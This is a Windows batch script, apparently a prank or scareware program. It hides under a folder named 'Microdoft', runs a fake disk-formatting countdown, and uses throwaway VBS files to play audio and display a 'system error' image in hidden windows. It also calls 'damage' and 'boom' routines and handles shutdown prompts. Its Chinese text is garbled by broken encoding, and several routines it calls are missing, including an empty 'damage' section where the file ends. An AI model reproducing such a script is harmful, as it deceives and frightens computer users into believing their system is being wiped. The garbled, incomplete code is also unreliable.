@title 
@echo off
>nul chcp 950
if exist "%SystemDrive%\Microdoft" cd /d "%SystemDrive%\Microdoft"
if not "%start%"=="1" goto DO
set Vfile="%SystemDrive%\Microdoft\Md1_0002d.ver"
goto Program start

:DO
set start=1
if exist "%SystemDrive%\Microdoft\DO.bat" (2>&1 call "%SystemDrive%\Microdoft\DO.bat") else (>&2 echo �w�˪��A���~�C & echo  �w�˪��A���~�C>>"%~dp0log.txt" & >nul timeout /t 10 & exit /b)
exit /b
)

:ready
cls
call:DT
title �q�����l�{���@%_DoDate%%_DoTime%
set MG=���l�Y�N�}�l
echo %MG%�C
set NT=�uZ�v��--�}�l�F�uX�v��--����
choice /n /t 30 /c zxr /d x /m "%NT%"
if %errorlevel%==3 (
echo %MG% "%NT%"�uR�v>> "%~dp0log.txt"
goto restart
)
if %errorlevel%==2 (
echo %MG% "%NT%"�uX�v>> "%~dp0log.txt"
call:boom
goto ready
)
if %errorlevel%==1 (
echo %MG% "%NT%"�uZ�v>> "%~dp0log.txt"
goto formatting
)

:formatting 
cls
title �{�����椤�K�K Now Running...
echo ���l���K�K
call:DT
echo �b%_DoDate%%_DoTime%�}�l�F���l>>"%~dp0log.txt"
>nul ping /n 1 /w 1000 127.0.0.1
for /L %%A in (1,1,111) do (
cls
echo ���l���K�K%%A�H
>nul ping /-n 1 /w 1000 127.0.0.1
)
cls
echo ���l���K�K65536�H
>nul timeout /t 1 /nobreak
cls
title �q�����l�����@%_DoDate%%_DoTime%
echo ���l�����A����`�ּ֡I
>nul timeout /t 1 /nobreak
call:DT
echo �b%_DoDate%%_DoTime%�����F���l>>"%~dp0log.txt"
echo ---------------------------------------------------------- >>"%~dp0log.txt"
>nul ping /n 1 /w 1000 127.0.0.1
set script="%temp%\%random%.vbs"
echo Set s= CreateObject("Wscript.Shell") > %script%
if "%ProgramFiles(x86)%"=="" (
echo s.run """%ProgramFiles%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
) else (
echo s.run """%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe"" ""%~dp01.mp3""","0" >> %script%
)
echo s.run """%~dp0�t�ο��~.png""","3" >> %script%
echo wscript.sleep 23500 >> %script%
echo s.run "taskkill /f /fi ""windowtitle eq �t�ο��~.png*""" ,"0" >> %script%
set script1="%temp%\%random%a.vbs"
echo Set c= CreateObject^("Wscript.Shell"^) > %script1%
echo c.run ""%script%"","0" >> %script1%
>nul 2>&1 call %script1%
del /f /q %script1%
>nul timeout /t 1 /nobreak
del /f /q %script%
set damage=1
call:damage
goto shutdown choice

:shutdown choice 
cls
call:DT
set MG=�q�����l����
title �q�����l�����@%_DoDate%%_DoTime%
set NT=�uZ�v��--�~��F�uX�v��--����
choice /n /t 3 /c zxqr /d x /m "%NT%"
if %errorlevel%==4 (
echo %MG% "%NT%"�uR�v>>"%~dp0log.txt"
shutdown /a
goto restart
)
if %errorlevel%==3 (
echo %MG% "%NT%"�uQ�v>>"%~dp0log.txt"
shutdown /a
goto shutdown choice
)
if %errorlevel%==2 (
echo %MG% "%NT%"�uX�v>>"%~dp0log.txt"
call:boom
goto shutdown choice
)
if %errorlevel%==1 (
echo %MG% "%NT%"�uZ�v>>"%~dp0log.txt"
echo �A���C
>nul timeout /t 1 /nobreak
call:DT
set damage=1.5
call:damage
echo ---------------------------------------------------------- >>"%~dp0log.txt"
set damage=2
call:damage
goto :eof
)

:damage
